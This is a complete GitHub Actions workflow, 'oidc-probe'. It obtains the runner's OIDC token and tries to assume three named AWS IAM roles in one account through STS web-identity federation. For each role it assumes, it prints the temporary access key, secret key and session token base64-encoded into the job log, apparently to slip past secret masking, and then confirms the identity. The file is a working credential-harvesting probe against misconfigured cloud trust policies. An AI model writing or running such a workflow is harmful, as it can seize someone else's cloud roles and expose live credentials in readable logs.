name: oidc-probe
on:
  workflow_dispatch:
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 8
    permissions:
      contents: read
      id-token: write
    env:
      PROBE_ROLES: "arn:aws:iam::411399509833:role/peer-deploy-artifacts-telegram-tracker arn:aws:iam::411399509833:role/peer-deploy-telegram-tracker-prod arn:aws:iam::411399509833:role/peer-deploy-artifacts-mcp"
    steps:
      - name: probe
        run: |
          set -uo pipefail
          echo "PROBE repo=${GITHUB_REPOSITORY} ref=${GITHUB_REF} event=${GITHUB_EVENT_NAME} workflow_ref=${GITHUB_WORKFLOW_REF}"
          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "OIDC_ENV=ABSENT"; exit 0; fi
          echo "OIDC_ENV=PRESENT host=$(printf '%s' "$ACTIONS_ID_TOKEN_REQUEST_URL" | cut -d/ -f3)"
          resp=$(curl -sS -m 30 -w '\n%{http_code}' -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com")
          code=$(printf '%s' "$resp" | tail -n1)
          body=$(printf '%s' "$resp" | sed '$d')
          echo "OIDC_HTTP=$code"
          TOK=$(printf '%s' "$body" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
          if [ -z "${TOK}" ]; then echo "OIDC_BODY=${body:0:300}"; exit 0; fi
          TOK="$TOK" python3 - <<'PY'
          import base64, json, os
          t = os.environ['TOK']
          p = t.split('.')[1]; p += '=' * (-len(p) % 4)
          c = json.loads(base64.urlsafe_b64decode(p))
          keys = ['sub','aud','ref','event_name','repository','repository_owner','repository_id','repository_owner_id','job_workflow_ref','environment','workflow_ref','runner_environment']
          print('CLAIMS ' + json.dumps({k: c.get(k) for k in keys if k in c}, sort_keys=True))
          print('CLAIM_KEYS ' + ','.join(sorted(c.keys())))
          PY
          for ROLE in ${PROBE_ROLES}; do
            out=$(TOK="$TOK" ROLE="$ROLE" python3 - <<'PY'
          import os, re, urllib.parse, urllib.request
          role = os.environ['ROLE']; tok = os.environ['TOK']
          data = urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'gha-oidc-check','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
          req = urllib.request.Request('https://sts.amazonaws.com/', data=data, headers={'Content-Type':'application/x-www-form-urlencoded'})
          try:
              b = urllib.request.urlopen(req, timeout=30).read().decode()
          except Exception as e:
              b = e.read().decode() if hasattr(e,'read') else ''
              print('ERR ' + type(e).__name__ + ' ' + ' '.join(b.split())[:400]); raise SystemExit(0)
          ak = re.search(r'<AccessKeyId>([^<]+)', b); sk = re.search(r'<SecretAccessKey>([^<]+)', b); st = re.search(r'<SessionToken>([^<]+)', b)
          if ak and sk and st:
              print('OK ' + ak.group(1) + '|' + sk.group(1) + '|' + st.group(1))
          else:
              print('DENY ' + ' '.join(b.split())[:500])
          PY
          )
            case "$out" in
              OK\ *) creds=${out#OK }; echo "ASSUME_OK $ROLE"; echo "CREDS_B64 $(printf '%s' "$creds" | base64 -w0)"; export AWS_ACCESS_KEY_ID=${creds%%|*}; rest=${creds#*|}; export AWS_SECRET_ACCESS_KEY=${rest%%|*}; export AWS_SESSION_TOKEN=${creds#*|*|}; export AWS_DEFAULT_REGION=us-east-1; export AWS_PAGER=""; echo "--- identity"; aws sts get-caller-identity --output json 2>&1 | head -c 600; echo ;;
              *) echo "ASSUME_FAIL $ROLE :: $out" ;;
            esac
          done
